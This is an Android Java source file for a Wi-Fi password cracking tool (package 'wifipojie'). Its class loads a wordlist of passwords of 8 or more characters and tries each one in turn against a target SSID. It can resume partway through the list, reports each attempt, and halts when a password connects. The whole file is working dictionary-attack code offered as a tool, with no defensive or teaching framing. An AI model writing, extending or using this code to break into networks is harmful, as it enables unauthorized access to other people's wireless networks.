package com.pojie.wifipojie;

import android.content.Context;
import android.text.TextUtils;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;

public class WifiPojie extends Thread {

    private Context context;
    private String SSID, DicPath, Password;
    private int TimeOut, ConnectType;
    private int currentTryIndex = 0;
    private boolean isRun = true;
    private OnPojieListener onPojieListener;
    private ArrayList<String> DicList = new ArrayList<>();

    public interface OnPojieListener {
        void onStatusUpdate(String message);
        void onFinished(boolean isSuccess, String password);
    }

    public WifiPojie(Context context, String SSID, String dicPath, String password, int timeOut, int connectType, int startIndex, OnPojieListener onPojieListener) {
        this.context = context;
        this.SSID = SSID;
        this.DicPath = dicPath;
        this.Password = password;
        this.TimeOut = timeOut;
        this.ConnectType = connectType;
        this.onPojieListener = onPojieListener;
        this.currentTryIndex = startIndex;
    }

    public int getCurrentTryIndex() {
        return currentTryIndex;
    }

    @Override
    public void run() {
        // Handle single password test
        if (!TextUtils.isEmpty(Password)) {
            onPojieListener.onStatusUpdate("Testing single password...");
            ConnectWifi connectWifi = new ConnectWifi(context, SSID, Password, TimeOut, ConnectType, isSuccess -> {
                if (isRun) {
                    onPojieListener.onFinished(isSuccess, Password);
                }
            });
            connectWifi.start();
            return;
        }

        // Handle dictionary attack
        if (!readDic()) return; // readDic handles error reporting

        for (int i = currentTryIndex; i < DicList.size(); i++) {
            if (!isRun) break;
            currentTryIndex = i;

            String currentPassword = DicList.get(i);
            onPojieListener.onStatusUpdate("Trying [" + (i + 1) + "/" + DicList.size() + "]: " + currentPassword);

            final boolean[] isAttemptFinished = {false};
            ConnectWifi connectWifi = new ConnectWifi(context, SSID, currentPassword, TimeOut, ConnectType, isSuccess -> {
                if (isRun && isSuccess) {
                    isRun = false; // Stop the loop on success
                    onPojieListener.onFinished(true, currentPassword);
                }
                isAttemptFinished[0] = true;
            });
            connectWifi.start();

            // Synchronously wait for the connection attempt to finish or timeout
            while (!isAttemptFinished[0] && isRun) {
                try {
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }

        if (isRun) { // Loop finished without being stopped by success
            onPojieListener.onFinished(false, null);
        }
    }

    private boolean readDic() {
        try {
            File file = new File(DicPath);
            if (!file.exists()) {
                onPojieListener.onStatusUpdate("Error: Dictionary file not found.");
                onPojieListener.onFinished(false, null);
                return false;
            }
            // Using try-with-resources to ensure streams are closed
            try (FileInputStream fis = new FileInputStream(file);
                 InputStreamReader inputReader = new InputStreamReader(fis);
                 BufferedReader bf = new BufferedReader(inputReader)) {

                String line;
                while ((line = bf.readLine()) != null) {
                    if (line.length() >= 8) {
                        DicList.add(line);
                    }
                }
            }
            onPojieListener.onStatusUpdate("Dictionary loaded. Total passwords: " + DicList.size());
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            onPojieListener.onStatusUpdate("Error reading dictionary: " + e.getMessage());
            onPojieListener.onFinished(false, null);
            return false;
        }
    }

    public void destroy(boolean isStopByUser) {
        this.isRun = false;
        if (isStopByUser) {
             onPojieListener.onStatusUpdate("Task stopped");
        }
    }
}
